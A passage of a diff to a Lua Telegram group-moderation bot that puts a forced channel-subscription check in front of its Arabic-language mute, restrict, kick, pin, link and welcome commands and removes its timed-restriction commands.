+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local username = text:match("^كتم @(.*)$")
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,"🚸┇البوت ليس ادمن يرجى ترقيتي !") 
@@ -3014,7 +3613,16 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^كتم (%d+)$") and Addictive(msg) then
+if text and text:match("^كتم (%d+)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local userid = text:match("^كتم (%d+)$")
 if Rank_Checking(userid, msg.chat_id_) == true then
 send(msg.chat_id_, msg.id_, "\n💢┇عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Get_Rank(userid,msg.chat_id_).." )")
@@ -3028,7 +3636,16 @@ Reply_Status(msg,userid,"reply","💢┇تم كتمه من هنا")
 end
 return false
 end
-if text == ("الغاء كتم") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
+if text == ("الغاء كتم") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 function Function_LARViN(extra, result, success)
 database:srem(bot_id.."LARViN:Muted:User"..msg.chat_id_, result.sender_user_id_)
 Reply_Status(msg,result.sender_user_id_,"reply","💢┇تم الغاء كتمه من هنا")  
@@ -3050,14 +3667,32 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN,
 return false
 end
 
-if text and text:match("^الغاء كتم (%d+)$") and Addictive(msg) then
+if text and text:match("^الغاء كتم (%d+)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local userid = text:match("^الغاء كتم (%d+)$") 
 database:srem(bot_id.."LARViN:Muted:User"..msg.chat_id_, userid)
 Reply_Status(msg,userid,"reply","💢┇تم الغاء كتمه من هنا")  
 return false
 end
 
-if text == ("تقيد") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
+if text == ("تقيد") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 function Function_LARViN(extra, result, success)
 if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, "\n💢┇عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
@@ -3070,7 +3705,16 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 ------------------------------------------------------------------------
-if text and text:match("^تقيد @(.*)$") and Addictive(msg) then
+if text and text:match("^تقيد @(.*)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local username = text:match("^تقيد @(.*)$")
 function Function_LARViN(extra, result, success)
 if result.id_ then
@@ -3092,7 +3736,16 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN,
 return false
 end
 ------------------------------------------------------------------------
-if text and text:match("^تقيد (%d+)$") and Addictive(msg) then
+if text and text:match("^تقيد (%d+)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local userid = text:match("^تقيد (%d+)$")
 if Rank_Checking(userid, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, "\n💢┇عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Get_Rank(userid,msg.chat_id_).." )")
@@ -3102,71 +3755,17 @@ Reply_Status(msg,userid,"reply","💢┇تم تقييده في المجموعه"
 end
 return false
 end
-if text and text:match('^تقيد (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
-local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*)$")}
-function Function_LARViN(extra, result, success)
-if TextEnd[3] == 'يوم' then
-Time_Restrict = TextEnd[2]:match('(%d+)')
-Time = Time_Restrict * 86400
-end
-if TextEnd[3] == 'ساعه' then
-Time_Restrict = TextEnd[2]:match('(%d+)')
-Time = Time_Restrict * 3600
-end
-if TextEnd[3] == 'دقيقه' then
-Time_Restrict = TextEnd[2]:match('(%d+)')
-Time = Time_Restrict * 60
-end
-TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
-TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
-TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
-if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
-send(msg.chat_id_, msg.id_, "\n💢┇عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
-else
-Reply_Status(msg,result.sender_user_id_,"reply", "☑┇تم تقيده لمدة ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
-https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
-end
-end
-tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
-return false
-end
-
-if text and text:match('^تقيد (%d+) (.*) @(.*)$') and Addictive(msg) then
-local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*) @(.*)$")}
-function Function_LARViN(extra, result, success)
-if result.id_ then
-if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
-send(msg.chat_id_,msg.id_,"💢┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
-return false 
-end      
-if TextEnd[3] == 'يوم' then
-Time_Restrict = TextEnd[2]:match('(%d+)')
-Time = Time_Restrict * 86400
-end
-if TextEnd[3] == 'ساعه' then
-Time_Restrict = TextEnd[2]:match('(%d+)')
-Time = Time_Restrict * 3600
-end
-if TextEnd[3] == 'دقيقه' then
-Time_Restrict = TextEnd[2]:match('(%d+)')
-Time = Time_Restrict * 60
-end
-TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
-TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
-TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
-if Rank_Checking(result.id_, msg.chat_id_) then
-send(msg.chat_id_, msg.id_, "\n💢┇عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Get_Rank(result.id_,msg.chat_id_).." )")
-else
-Reply_Status(msg,result.id_,"reply", "☑┇تم تقيده لمدة ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
-https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
-end
-end
-end
-tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, Function_LARViN, nil)
-return false
-end
 ------------------------------------------------------------------------
-if text == ("الغاء تقيد") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
+if text == ("الغاء تقيد") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 function Function_LARViN(extra, result, success)
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 Reply_Status(msg,result.sender_user_id_,"reply","💢┇تم الغاء تقييده")  
@@ -3175,7 +3774,16 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 ------------------------------------------------------------------------
-if text and text:match("^الغاء تقيد @(.*)$") and Addictive(msg) then
+if text and text:match("^الغاء تقيد @(.*)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local username = text:match("^الغاء تقيد @(.*)$")
 function Function_LARViN(extra, result, success)
 if result.id_ then
@@ -3189,13 +3797,31 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN,
 return false
 end
 ------------------------------------------------------------------------
-if text and text:match("^الغاء تقيد (%d+)$") and Addictive(msg) then
+if text and text:match("^الغاء تقيد (%d+)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local userid = text:match("^الغاء تقيد (%d+)$")
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 Reply_Status(msg,userid,"reply","💢┇تم الغاء تقييده")  
 return false
 end
-if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Addictive(msg) then
+if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'💢┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
 return false
@@ -3221,7 +3847,16 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end  
-if text and text:match("^طرد @(.*)$") and Addictive(msg) then 
+if text and text:match("^طرد @(.*)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 local username = text:match("^طرد @(.*)$")
 if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'💢┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
@@ -3257,7 +3892,16 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN,
 return false
 end  
 
-if text and text:match("^طرد (%d+)$") and Addictive(msg) then 
+if text and text:match("^طرد (%d+)$") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 local userid = text:match("^طرد (%d+)$") 
 if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'💢┇لقد تم تعطيل الحظر و الطرد من قبل المنشئين')
@@ -3282,28 +3926,64 @@ end
 return false
 end
 
-if text == "تعطيل الطرد" or text == "تعطيل الحظر" then
+if text == "تعطيل الطرد" or text == "تعطيل الحظر" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Constructor(msg) then
 database:set(bot_id.."Ban:Cheking"..msg.chat_id_,"true")
 send(msg.chat_id_, msg.id_, '🔏┇تم تعطيل » الحظر ~ والطرد ')
 return false
 end
 end
-if text == "تفعيل الطرد" or text == "تفعيل الحظر" then
+if text == "تفعيل الطرد" or text == "تفعيل الحظر" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Constructor(msg) then
 database:del(bot_id.."Ban:Cheking"..msg.chat_id_)
 send(msg.chat_id_, msg.id_, '☑┇تم تفعيل » الحظر ~ والطرد ')
 return false
 end
 end
-if text == "تعطيل الرفع" or text == "تعطيل الترقيه" then
+if text == "تعطيل الرفع" or text == "تعطيل الترقيه" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Constructor(msg) then
 database:set(bot_id.."Add:Group:Cheking"..msg.chat_id_,"true")
 send(msg.chat_id_, msg.id_, '🔏┇تم تعطيل رفع » الادمن ~ المميز ')
 return false
 end
 end
-if text == "تفعيل الرفع" or text == "تفعيل الترقيه" then
+if text == "تفعيل الرفع" or text == "تفعيل الترقيه" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Constructor(msg) then
 database:del(bot_id.."Add:Group:Cheking"..msg.chat_id_)
 send(msg.chat_id_, msg.id_, '☑┇تم تفعيل رفع » الادمن ~ المميز ')
@@ -3311,6 +3991,15 @@ return false
 end
 end
 if text ==("تثبيت") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:sismember(bot_id.."LARViN:Lock:pin",msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_,msg.id_,"📬┇التثبيت والغاء التثبيت تم قفله من قبل المنشئين")  
 return false  
@@ -3327,6 +4016,15 @@ end
 end,nil) 
 end
 if text == "الغاء التثبيت" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:sismember(bot_id.."LARViN:Lock:pin",msg.chat_id_) and not Constructor(msg) then
 send(msg.chat_id_,msg.id_,"📬┇التثبيت والغاء التثبيت تم قفله من قبل المنشئين")  
 return false  
@@ -3354,6 +4052,15 @@ database:hset(bot_id.."LARViN:flooding:settings:"..msg.chat_id_ ,"floodtime" ,Nu
 send(msg.chat_id_, msg.id_,"📮┇تم وضع زمن التكرار ("..Num..")") 
 end
 if text == "ضع رابط" or text == "وضع رابط" then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if msg.reply_to_message_id_ == 0  and Addictive(msg) then  
 send(msg.chat_id_,msg.id_,"📥┇ارسل رابط المجموعه او رابط قناة المجموعه")
 database:setex(bot_id.."LARViN:Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
@@ -3361,6 +4068,15 @@ return false
 end
 end
 if text == "تفعيل جلب الرابط" or text == 'تفعيل الرابط' then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then  
 database:set(bot_id.."LARViN:Link_Group"..msg.chat_id_,true) 
 send(msg.chat_id_, msg.id_,"📮┇تم تفعيل جلب الرابط المجموعه") 
@@ -3368,12 +4084,30 @@ return false
 end
 end
 if text == "تعطيل جلب الرابط" or text == 'تعطيل الرابط' then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then  
 database:del(bot_id.."LARViN:Link_Group"..msg.chat_id_) 
 send(msg.chat_id_, msg.id_,"☑┇تم تعطيل جلب رابط المجموعه") 
 return false end
 end
 if text == "الرابط" then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local status_Link = database:get(bot_id.."LARViN:Link_Group"..msg.chat_id_)
 if not status_Link then
 send(msg.chat_id_, msg.id_,"☑┇جلب الرابط معطل") 
@@ -3387,6 +4121,15 @@ send(msg.chat_id_, msg.id_,"📫┇لا يوجد رابط ارسل ضع رابط
 end            
 end
 if text == "مسح الرابط" or text == "حذف الرابط" then
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then     
 send(msg.chat_id_,msg.id_,"☑┇تم مسح الرابط ")           
 database:del(bot_id.."LARViN:Private:Group:Link"..msg.chat_id_) 
@@ -3395,11 +4138,29 @@ end
 return false  
 end
 if text and text:match("^ضع صوره") and Addictive(msg) and msg.reply_to_message_id_ == 0 or text and text:match("^وضع صوره") and Addictive(msg) and msg.reply_to_message_id_ == 0 then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_,true) 
 send(msg.chat_id_, msg.id_,"🎇┇ارسل لي الصوره") 
 return false
 end
 if text == "حذف الصوره" or text == "مسح الصوره" then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then
 https.request("https://api.telegram.org/bot"..token.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
 send(msg.chat_id_, msg.id_,"☑┇تم ازالة صورة المجموعه") 
@@ -3407,6 +4168,15 @@ end
 return false  
 end
 if text == "ضع وصف" or text == "وضع وصف" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then
 database:setex(bot_id.."LARViN:Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
 send(msg.chat_id_, msg.id_,"📥┇ارسل الان الوصف")
@@ -3414,6 +4184,15 @@ end
 return false  
 end
 if text == "ضع ترحيب" or text == "وضع ترحيب" then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then
 database:setex(bot_id.."LARViN:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
 t  = "🔖┇ارسل لي الترحيب الان"
@@ -3423,6 +4202,15 @@ end
 return false  
 end
 if text == "الترحيب" and Addictive(msg) then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if database:get(bot_id.."LARViN:Get:Welcome:Group"..msg.chat_id_)   then 
 Welcome = database:get(bot_id.."LARViN:Get:Welcome:Group"..msg.chat_id_)  
 else 
@@ -3432,16 +4220,43 @@ send(msg.chat_id_, msg.id_,"["..Welcome.."]")
 return false  
 end
 if text == "تفعيل الترحيب" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Chek:Welcome"..msg.chat_id_,true) 
 send(msg.chat_id_, msg.id_,"☑┇تم تفعيل ترحيب المجموعه") 
 return false  
 end
 if text == "تعطيل الترحيب" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Chek:Welcome"..msg.chat_id_) 
 send(msg.chat_id_, msg.id_,"☑┇تم تعطيل ترحيب المجموعه") 
 return false  
 end
 if text == "مسح الترحيب" or text == "حذف الترحيب" then 
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if Addictive(msg) then
 database:del(bot_id.."LARViN:Get:Welcome:Group"..msg.chat_id_) 
 send(msg.chat_id_, msg.id_,"☑┇تم ازالة ترحيب المجموعه") 
@@ -3450,6 +4265,15 @@ return false
 end
 
 if text == "مسح قائمه المنع" and Addictive(msg) then   
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local list = database:smembers(bot_id.."LARViN:List:Filter"..msg.chat_id_)  
 for k,v in pairs(list) do  
 database:del(bot_id.."LARViN:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
@@ -3459,7 +4283,16 @@ end
 send(msg.chat_id_, msg.id_,"☑┇تم مسح قائمه المنع")  
 end
 
-if text == "قائمه المنع" and Addictive(msg) then   
+if text == "قائمه المنع" and Addictive(msg) then  
+ if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
